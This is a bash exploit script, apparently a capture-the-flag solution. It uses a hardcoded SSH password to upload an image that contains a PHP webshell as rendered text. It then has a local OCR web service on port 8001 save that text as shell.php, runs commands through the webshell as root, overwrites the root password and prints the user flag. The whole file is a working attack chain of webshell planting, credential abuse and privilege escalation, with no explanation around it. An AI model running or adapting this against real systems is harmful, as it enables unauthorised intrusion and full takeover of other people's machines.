#!/bin/bash

if [ $# -ne 1 ]; then
    echo "Usage: $0 <target_ip>"
    exit 1
fi

TARGET=$1
PASSWORD="JbhHDAEgXvri3!"          # walter's password
NEW_PASS="root123"                  # choose your own

echo "[+] Creating shell.png with PHP webshell..."
python3 -c "
from PIL import Image, ImageDraw, ImageFont
img = Image.new('RGB', (800, 100), (255,255,255))
d = ImageDraw.Draw(img)
try:
    font = ImageFont.truetype('/usr/share/fonts/truetype/dejavu/DejaVuSansMono-Bold.ttf', 28)
except:
    font = ImageFont.load_default()
d.text((10, 30), '<?php system(\$_GET[\"c\"]); ?>', fill=(0,0,0), font=font)
img.save('shell.png')
"

echo "[+] Uploading to $TARGET..."
sshpass -p "$PASSWORD" scp shell.png "walter@$TARGET:/home/walter/"

echo "[+] Connecting via SSH, setting up webshell, and changing root password..."
sshpass -p "$PASSWORD" ssh -t "walter@$TARGET" << 'ENDSSH'

    # ---- Prepare webshell ----
    B64=$(base64 -w 0 ~/shell.png)
    OCR_ID=$(curl -s -c /tmp/jar -b /tmp/jar -X POST http://localhost:8001/ \
      -u 'walter:JbhHDAEgXvri3!' \
      --data-urlencode "canvas_image=data:image/png;base64,$B64" | \
      grep -oP 'ocr_id" value="\K[^"]+')
    curl -s -b /tmp/jar -X POST http://localhost:8001/ \
      -u 'walter:JbhHDAEgXvri3!' \
      --data "ocr_id=$OCR_ID&filename=shell.php&save_output=1" > /dev/null
    WEBSHELL_URL="http://localhost:8001/saved/shell.php"
    echo "[+] Webshell ready at $WEBSHELL_URL"

    # ---- Helper to run commands via webshell (proper URL encoding) ----
    ws_cmd() {
        # Use --data-urlencode to handle all special characters
        curl -s -G "$WEBSHELL_URL" \
          -u 'walter:JbhHDAEgXvri3!' \
          --data-urlencode "c=$1" 2>/dev/null
    }

    echo ""
    echo "[+] Checking webshell user..."
    WHOAMI=$(ws_cmd "whoami")
    if [ "$WHOAMI" != "root" ]; then
        echo "[!] Webshell is not root! Aborting."
        exit 1
    fi
    echo "[+] Webshell runs as root – good."

    # ---- Change root password: generate hash on target and apply ----
    echo "[+] Changing root password to '$NEW_PASS'..."
    ws_cmd "sh -c 'echo \"root:\$(openssl passwd -6 $NEW_PASS)\" | chpasswd -e'"
    echo "[+] Password changed."

    # ---- Verify ----
    echo "[+] Checking if password change worked (trying 'su' with 'echo' - we'll just test login later)."

    echo ""
    echo "--- USER FLAG (for reference) ---"
    cat /home/walter/user.txt 2>/dev/null
    echo "--------------------------------"

ENDSSH

echo ""
echo "[+] ========== ROOT PASSWORD CHANGED =========="
echo "Now SSH directly as root:"
echo "  sshpass -p '$NEW_PASS' ssh root@$TARGET"
echo "  (or: ssh root@$TARGET  and enter '$NEW_PASS')"
echo ""
echo "If that fails (PermitRootLogin disabled), use:"
echo "  ssh walter@$TARGET"
echo "  then 'su -' and enter '$NEW_PASS'"
echo "================================================"

echo "[+] Cleaning up..."
rm -f shell.png
echo "[+] Done."
